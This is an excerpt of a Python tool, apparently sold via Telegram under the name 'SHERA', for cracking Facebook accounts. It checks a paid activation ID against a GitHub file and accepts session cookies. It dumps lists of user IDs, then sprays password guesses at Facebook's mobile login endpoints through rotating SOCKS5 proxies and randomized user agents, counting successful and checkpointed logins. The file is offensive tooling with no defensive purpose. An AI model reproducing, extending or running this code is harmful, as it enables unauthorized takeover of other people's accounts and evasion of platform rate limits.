...
try:
	prox= requests.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
...
def chk():
  ...
  try: 
    ...
    httpCaht = requests.get("https://github.com/shwansorany80/SHERA1667/blob/main/ACTIV%20ID").text
    if id in httpCaht: 

      print("\033[92m   ID IS ACTIVE\033[97m") 
      ...
      print(' ')
      print("\033[0;91m NO ACTIV SEND ME ID @u69xii")
      os.system('xdg-open  https://t.me/u69xii')
...
def chk():
  ...
  try: 
    ...
    if id in httpCaht: 
      ...
      print("\033[0;96m TOOLY BY SHERA Pric 2month 5$ TELEGRAM @u69xii") 

      os.system('xdg-open t.me/@u69xii ')
...
def MLO():
	try:
		os.system('clear')
		banner()
		your_cookies = input('Cookie Dabne =  ')
		with requests.Session() as r:
			try:
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print("  Cookies Halaya", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
...
def menu(my_name,my_id):
	...
	os.system('clear')
	banner()
	print('\x1b[1;90m                 [ 1 ] CRACK PUBLIC')
	print('\x1b[1;90m                 [ 2 ] DUMP IDS')
	print('\x1b[1;90m                 [ 3 ] CRACK FILE')
	print('\x1b[1;90m                 [ 0 ] EXIT TOOL ')
	print('')
	_____alvino__adijaya_____ = input('                 CHOOS =  ')
	print('')
...
def dump_publik():
	try:
		...
		exit()
	try:
		jum = int(input('\x1b[1;91mHOW MUCH IDS? = '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input('\x1b[1;91mFB ID  '+str(yz)+' = \x1b[1;93m')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		#print(f'\x1b[1;91mTOTAL IDS =\x1b[1;93m '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mSinyal Anda Kurang Bagus Nih !')
...
def setting():
	print(f'{x}')
	#print('')
	#print('\x1b[1;92m[ 1 ] CLONE NEW')
	#print('\x1b[1;92m[ 2 ] CLONE OLD')
	#print('\x1b[1;92m[ 3 ] RANDOM')
	print('')
	hu = '3'
	if hu in ['1','01']:
		...
		exit()
	print('')
	#print('\x1b[1;92m[ 1 ] METHOD MOBILE\x1b[1;92m   [\x1b[1;93m ALL NETWORK \x1b[1;92m]')
	#print('\x1b[1;92m[ 2 ] METHOD ASYNC\x1b[1;92m    [\x1b[1;91m NOT GOOD \x1b[1;92m]')
	#print('\x1b[1;92m[ 3 ] METHOD MBASIC\x1b[1;92m   [\x1b[1;93m KORAK NETWORK \x1b[1;92m]')
	print('')
	hc = '1'
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	#_jembot_ = input('\x1b[1;91mVIEW APPLICATION [\x1b[1;92mY\x1b[1;91m] --->\x1b[1;93m ‌')
	#if _jembot_ in ['']:
		#back()
		...
		#taplikasi.append('no')
	print('')
	#pwplus=input('\x1b[1;91mMANUAL PASSWORD  [\x1b[1;92mT\x1b[1;91m] --->\x1b[1;93m ')
	#if pwplus in ['y','Y']:
		#pwpluss.append('ya')
		#cetak(nel(' '))
		#pwku=input('')
...
def crackmobile(idf,pwv):
	...
	sys.stdout.write(f"\rSHERA {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} - {P}\033[1;31mCP - 0{x} - {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False,proxies=proxs)
				...
				#print( f'\r{M}THANATOS--->BAD   {idf} | {pw}')
...
def crackasync(idf,pwv):
	...
	sys.stdout.write(f"\r 〔SHER〕 {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} - {P}\033[1;31mCP - {cp}{x} - {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			#elif "checkpoint" in po.cookies.get_dict().keys():
			#	print(f'\r{M}THANATOS-CP  {m}{idf} | {m}{pw}')
				#open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#akun.append(idf+'|'+pw)
			#	cp+=1
			#	break
...
def crackmbasic(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write(f"\r 〔SHER-V1〕 {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} - {P}\033[1;31mCP - {cp}{x} - {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
...
def cek_apk(kuki):
	...
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➡︎ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	...
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➡︎ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
